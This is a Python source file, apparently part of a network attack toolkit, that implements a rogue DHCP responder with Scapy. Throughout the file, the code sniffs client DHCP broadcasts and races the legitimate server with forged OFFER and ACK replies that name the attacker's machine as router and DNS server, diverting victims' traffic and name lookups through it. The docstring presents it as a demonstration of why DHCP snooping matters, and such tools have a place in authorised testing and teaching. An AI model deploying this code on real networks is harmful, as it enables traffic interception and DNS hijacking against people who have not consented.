"""
dhcp_spoofer.py — Rogue DHCP server / race-the-response responder.

Listens for client DHCP DISCOVER and REQUEST broadcasts on UDP 67 and
replies with crafted OFFER / ACK packets faster than the legitimate
DHCP server. The forged config can point the victim at our own machine
as DNS server and / or default gateway — a clean way to demonstrate
why DHCP snooping should be enabled on managed switches.

We deliberately do **not** implement DHCP starvation (claiming every
address in the pool); that would be a denial-of-service against the
shared network. Instead we just race the legit reply — clients keep
working, they just pick up our DNS / gateway when they ask.

RFC 2131 reference fields used here:

* ``op``     — 2 for BOOTREPLY
* ``xid``    — copied from the client's request
* ``yiaddr`` — IP we offer (we hand out ``leases_start``, then increment)
* ``siaddr`` — the (forged) DHCP server's IP — ours
* ``chaddr`` — copied from the client's request
* options::
    53 (message type)  =  2 OFFER  /  5 ACK
    54 (server id)     =  our IP
    51 (lease time)    =  e.g. 43200 (12 h)
    1  (subnet mask)   =  e.g. 255.255.255.0
    3  (router)        =  our IP (so traffic flows through us)
    6  (DNS server)    =  our IP (so DNS goes through us)

Fail-soft when Scapy is unavailable.
"""

from __future__ import annotations

import collections
import ipaddress
import threading
import time
from typing import Optional

try:
    from scapy.all import sniff, sendp  # type: ignore
    from scapy.layers.dhcp import BOOTP, DHCP  # type: ignore
    from scapy.layers.inet import IP, UDP  # type: ignore
    from scapy.layers.l2 import Ether  # type: ignore

    SCAPY_AVAILABLE = True
except Exception:
    SCAPY_AVAILABLE = False


DHCP_SERVER_PORT = 67
DHCP_CLIENT_PORT = 68


def _format_mac_bytes(raw: bytes) -> str:
    """Scapy's ``chaddr`` is a 16-byte field padded with zeros; first 6 are MAC."""
    return ":".join(f"{b:02x}" for b in raw[:6])


class DHCPSpoofer:
    """Rogue DHCP responder.

    Parameters
    ----------
    iface:
        Interface to listen and send on (e.g. ``en0``).
    server_ip:
        IP this rogue server claims as its own and uses for the
        ``siaddr`` / option 54 / router / DNS server fields. Defaults
        to the attacker's machine IP.
    server_mac:
        L2 source MAC of our forged replies — typically the attacker's
        interface MAC.
    subnet:
        Subnet (e.g. ``"10.0.0.0/24"``) used to pick offered IPs and
        the subnet mask.
    dns_ip:
        DNS server IP to advertise. Defaults to ``server_ip`` — pairs
        nicely with the DNS Spoofer companion.
    gateway_ip:
        Router/gateway IP to advertise. Defaults to ``server_ip`` so
        the victim routes through us; supply the real gateway if you
        only want to hijack DNS.
    leases_start:
        First IP to hand out (we increment from here). When ``None``
        we just echo back the IP the victim already had if available.
    """

    HIT_LIMIT = 500

    def __init__(
        self,
        iface: Optional[str],
        server_ip: str,
        server_mac: str,
        subnet: str,
        dns_ip: Optional[str] = None,
        gateway_ip: Optional[str] = None,
        leases_start: Optional[str] = None,
    ) -> None:
        self.iface = iface
        self.server_ip = server_ip
        self.server_mac = server_mac
        self.dns_ip = dns_ip or server_ip
        self.gateway_ip = gateway_ip or server_ip
        try:
            self._network = ipaddress.IPv4Network(subnet, strict=False)
        except ValueError as exc:
            raise RuntimeError(f"Invalid subnet for DHCP spoof: {subnet}") from exc
        self._subnet_mask = str(self._network.netmask)
        # Choose the first usable IP after the gateway as our pool start
        # unless the user supplied one. We just increment from here.
        self._next_ip = (
            ipaddress.IPv4Address(leases_start)
            if leases_start
            else self._network.network_address + 100
        )
        self._lock = threading.Lock()
        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self.hits: int = 0
        self.recent_hits: collections.deque = collections.deque(
            maxlen=self.HIT_LIMIT,
        )
        self.started_at: float = 0.0

    # ------------------------------------------------------------------ #

    @property
    def is_running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()

    @property
    def uptime_seconds(self) -> float:
        return time.time() - self.started_at if self.started_at else 0.0

    def start(self) -> None:
        if not SCAPY_AVAILABLE:
            raise RuntimeError("Scapy is required for DHCP spoofer.")
        if not self.server_ip:
            raise RuntimeError("DHCP spoofer needs a server_ip.")
        if self.is_running:
            return
        self._stop_event.clear()
        self.started_at = time.time()
        self._thread = threading.Thread(target=self._sniff_loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=2.0)
            self._thread = None

    def snapshot(self) -> dict:
        with self._lock:
            return {
                "running":     self.is_running,
                "uptime":      self.uptime_seconds,
                "server_ip":   self.server_ip,
                "dns_ip":      self.dns_ip,
                "gateway_ip":  self.gateway_ip,
                "hits":        self.hits,
                "recent_hits": list(self.recent_hits),
            }

    # ------------------------------------------------------------------ #

    def _next_lease(self) -> str:
        """Pick the next IP from the pool, skipping our own / broadcast / gateway."""
        skip = {
            ipaddress.IPv4Address(self.server_ip),
            ipaddress.IPv4Address(self.gateway_ip),
            self._network.network_address,
            self._network.broadcast_address,
        }
        ip = self._next_ip
        # Wrap around when we reach the broadcast address.
        while ip in skip or ip >= self._network.broadcast_address:
            ip = ip + 1
            if ip >= self._network.broadcast_address:
                ip = self._network.network_address + 100
        self._next_ip = ip + 1
        return str(ip)

    def _sniff_loop(self) -> None:
        # Filter for DHCP client→server broadcasts (UDP 67 dst).
        bpf = "udp and (port 67 or port 68)"
        try:
            sniff(
                iface=self.iface,
                filter=bpf,
                prn=self._on_packet,
                store=False,
                stop_filter=lambda _p: self._stop_event.is_set(),
            )
        except Exception:
            pass

    def _on_packet(self, packet) -> None:
        try:
            if not (packet.haslayer(BOOTP) and packet.haslayer(DHCP)):
                return
            bootp = packet[BOOTP]
            if int(bootp.op) != 1:        # we only reply to BOOTREQUEST
                return

            # Extract DHCP message type (option 53).
            msg_type = None
            requested_ip = None
            for opt in packet[DHCP].options:
                if not isinstance(opt, tuple):
                    continue
                if opt[0] == "message-type":
                    msg_type = int(opt[1])
                elif opt[0] == "requested_addr":
                    requested_ip = opt[1]

            # 1=DISCOVER → reply OFFER (2); 3=REQUEST → reply ACK (5).
            if msg_type == 1:
                reply_type = 2
            elif msg_type == 3:
                reply_type = 5
            else:
                return

            client_mac = _format_mac_bytes(bytes(bootp.chaddr))
            offered_ip = requested_ip or self._next_lease()
            xid = int(bootp.xid)

            response = (
                Ether(src=self.server_mac, dst="ff:ff:ff:ff:ff:ff")
                / IP(src=self.server_ip, dst="255.255.255.255")
                / UDP(sport=DHCP_SERVER_PORT, dport=DHCP_CLIENT_PORT)
                / BOOTP(
                    op=2, xid=xid,
                    yiaddr=offered_ip,
                    siaddr=self.server_ip,
                    chaddr=bytes(bootp.chaddr),
                )
                / DHCP(options=[
                    ("message-type", reply_type),
                    ("server_id",    self.server_ip),
                    ("lease_time",   43200),     # 12 hours
                    ("subnet_mask",  self._subnet_mask),
                    ("router",       self.gateway_ip),
                    ("name_server",  self.dns_ip),
                    "end",
                ])
            )
            try:
                sendp(response, iface=self.iface, verbose=0)
            except Exception:
                return

            with self._lock:
                self.hits += 1
                self.recent_hits.append({
                    "ts":       time.time(),
                    "kind":     "OFFER" if reply_type == 2 else "ACK",
                    "client":   client_mac,
                    "offered":  offered_ip,
                    "dns":      self.dns_ip,
                    "gateway":  self.gateway_ip,
                })
        except Exception:
            pass
